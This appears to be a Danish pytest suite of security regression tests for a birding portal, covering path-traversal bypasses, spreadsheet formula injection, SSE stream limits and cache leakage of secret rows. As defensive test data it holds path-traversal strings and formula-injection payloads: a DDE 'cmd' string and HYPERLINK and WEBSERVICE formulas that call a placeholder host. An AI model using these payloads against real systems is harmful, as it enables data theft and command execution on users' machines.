"""Sikkerhedsregressioner fra tredje runde af gennemgangen 2026-11-08 (docs/sikkerhed/gennemgang-2026-11-08-runde3.md).

Kører uden database og Valkey.
"""

from __future__ import annotations

import ast
import csv
import io
import zipfile
from pathlib import Path

import pytest

PORTAL = Path(__file__).resolve().parents[1] / "portal"


# ---------------------------------------------------------------- T-01: stier uden normalform


@pytest.mark.parametrize("path", [
    "/audio//mobgang/x.mp3", "/audio/x/../mobgang/x.mp3", "/v/abc/audio//mobgang/x.mp3", "/v/abc/audio/x/../mobgang/x.mp3",
    "/media/netfugl/../xc/1.wav", "/media/netfugl/./../snd/x.mp3", "/media//obs/x.jpg", "//api/me/export", "/api/./me/export",
    "/media/netfugl/..",
])
def test_canonical_afviser_stier_der_normaliseres(path):
    from portal.main import canonical

    assert not canonical(path)


@pytest.mark.parametrize("path", ["/", "/index.html", "/api/me", "/v/abc/js/app.js", "/media/netfugl/a.jpg",
                                  "/audio/mobgang/x.mp3", "/api/ics/abc/mine.ics", "/media/art/ab/x..y.webp"])
def test_canonical_godtager_almindelige_stier(path):
    from portal.main import canonical

    assert canonical(path)


async def _asgi_get(app, path: str) -> int:
    """GET med en rå sti, som httpx ellers ville normalisere ('..' fjernes af klienten, ikke af en angriber)."""
    scope = {"type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": "GET", "scheme": "http",
             "path": path, "raw_path": path.encode(), "root_path": "", "query_string": b"", "headers": [(b"host", b"test")],
             "client": ("127.0.0.1", 1), "server": ("test", 80)}
    sent: list[dict] = []

    async def receive():
        return {"type": "http.request", "body": b"", "more_body": False}

    async def send(msg):
        sent.append(msg)

    await app(scope, receive, send)
    return next(m["status"] for m in sent if m["type"] == "http.response.start")


@pytest.mark.parametrize("path", ["/audio//mobgang/azurmejse-XC1012313.mp3", "/audio/x/../mobgang/azurmejse-XC1012313.mp3",
                                  "/v/abc/audio/x/../mobgang/azurmejse-XC1012313.mp3", "/media/netfugl/../snd/x.mp3"])
async def test_vagten_afviser_omveje_uden_login(monkeypatch, path):
    """Før rettelsen gav de første tre 200 med lydfilen (Mobgang-spærren sprunget over) for anonyme."""
    from portal import main

    async def no_session(_token):
        return None

    monkeypatch.setattr(main, "session_user_id", no_session)
    assert await _asgi_get(main.app, path) == 404


# ---------------------------------------------------------------- T-02: formler i regneark


@pytest.mark.parametrize("value", ["=HYPERLINK(\"http://x/?\"&A1;\"klik\")", "+1+cmd|' /C calc'!A0", "-2+3", "@SUM(1)",
                                   "\t=1", "=WEBSERVICE(\"http://x\")"])
def test_csv_cell_neutraliserer_formler(value):
    from portal.services.sheets import csv_cell

    assert csv_cell(value) == "'" + value


@pytest.mark.parametrize("value,expected", [(None, ""), ("-12,5", "-12,5"), ("+45", "+45"), ("-", "-"), ("Rød glente", "Rød glente"),
                                            (-3, -3), (2.5, 2.5), ("", "")])
def test_csv_cell_roerer_ikke_almindelige_vaerdier(value, expected):
    from portal.services.sheets import csv_cell

    assert csv_cell(value) == expected


def test_regneark_csv_har_ingen_formler():
    from portal.services import sheets

    out = sheets.to_csv(["note"], [["=1+1"], ["ok"]]).decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(out), delimiter=";"))
    assert rows[1] == ["'=1+1"] and rows[2] == ["ok"]


def test_regneark_xlsx_gemmer_formel_som_tekst():
    from portal.services import sheets

    data = sheets.to_xlsx(["note", "antal"], [["=WEBSERVICE(\"http://x\")", 3]])
    xml = zipfile.ZipFile(io.BytesIO(data)).read("xl/worksheets/sheet1.xml").decode()
    assert "<f>" not in xml  # ingen formel
    assert "=WEBSERVICE" in xml and 't="inlineStr"' in xml  # teksten er bevaret uændret
    assert '<c r="B2" t="n"><v>3</v>' in xml  # tal er stadig tal


def test_holdmatrix_csv_neutraliserer_deltagernavn():
    from portal.services.learn_paths import csv_matrix

    m = {"punkter": [{"id": 1, "title": "=titel"}],
         "deltagere": [{"navn": "=HYPERLINK(\"http://x\")", "punkter": {"1": {"done": True, "venter": False, "pct": None}}}]}
    rows = list(csv.reader(io.StringIO(csv_matrix(m)), delimiter=";"))
    assert rows[0][1] == "'=titel"
    assert rows[1] == ["'=HYPERLINK(\"http://x\")", "ja"]


def test_soegning_csv_bruger_csv_cell():
    """Søgningens CSV (api/dofbasen.soeg_csv) skriver noter fra andre brugere – den skal gå gennem csv_cell."""
    src = (PORTAL / "api" / "dofbasen.py").read_text()
    body = src[src.index("async def soeg_csv"):]
    body = body[:body.index("\n@router")]
    assert "sheets.csv_cell(" in body


# ---------------------------------------------------------------- T-03: loft over åbne SSE-strømme

_REQ = type("Req", (), {"state": type("State", (), {})()})()


async def test_stream_loft_pr_bruger(monkeypatch):
    from fastapi import HTTPException

    from portal.api import feed

    monkeypatch.setattr(feed, "_open_streams", {})
    user = type("U", (), {"id": 42})()
    responses = [await feed.stream(request=_REQ, user=user) for _ in range(feed.STREAMS_PER_USER)]
    assert feed._open_streams[42] == feed.STREAMS_PER_USER
    with pytest.raises(HTTPException) as exc:
        await feed.stream(request=_REQ, user=user)
    assert exc.value.status_code == 429
    # En anden bruger rammes ikke
    other = await feed.stream(request=_REQ, user=type("U", (), {"id": 43})())
    assert feed._open_streams[43] == 1
    del other
    # Strømme, der aldrig blev startet (klienten gik med det samme), frigiver pladsen, når de ryddes op
    responses.pop()
    import gc

    gc.collect()
    assert feed._open_streams[42] == feed.STREAMS_PER_USER - 1
    assert 43 not in feed._open_streams
    responses.clear()
    gc.collect()
    assert 42 not in feed._open_streams


def test_stream_slot_frigives_kun_en_gang(monkeypatch):
    from portal.api import feed

    monkeypatch.setattr(feed, "_open_streams", {})
    a, b = feed._StreamSlot(7), feed._StreamSlot(7)
    a.release()
    a.release()
    assert feed._open_streams[7] == 1
    b.release()
    assert 7 not in feed._open_streams


# ---------------------------------------------------------------- A-02 (runde 2): secret_for aldrig i en cachet funktion


def test_secret_for_ikke_i_cachede_funktioner():
    """cached(...) har nøgler uden seer. Sendes secret_for (ejerens hemmelige rækker) fra en funktion, der cacher, går
    rækkerne til alle, der rammer samme nøgle. Tjekket er statisk og fanger kun kald i samme funktion (inkl. indlejrede)."""
    hits = []
    for f in PORTAL.rglob("*.py"):
        for fn in ast.walk(ast.parse(f.read_text())):
            if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            calls = [n for n in ast.walk(fn) if isinstance(n, ast.Call)]
            cached = any(getattr(c.func, "id", None) == "cached" or getattr(c.func, "attr", None) == "cached" for c in calls)
            secret = any(k.arg == "secret_for" and not (isinstance(k.value, ast.Constant) and k.value.value is None)
                         for c in calls for k in c.keywords)
            if cached and secret:
                hits.append(f"{f.relative_to(PORTAL)}:{fn.lineno} {fn.name}")
    assert not hits, hits
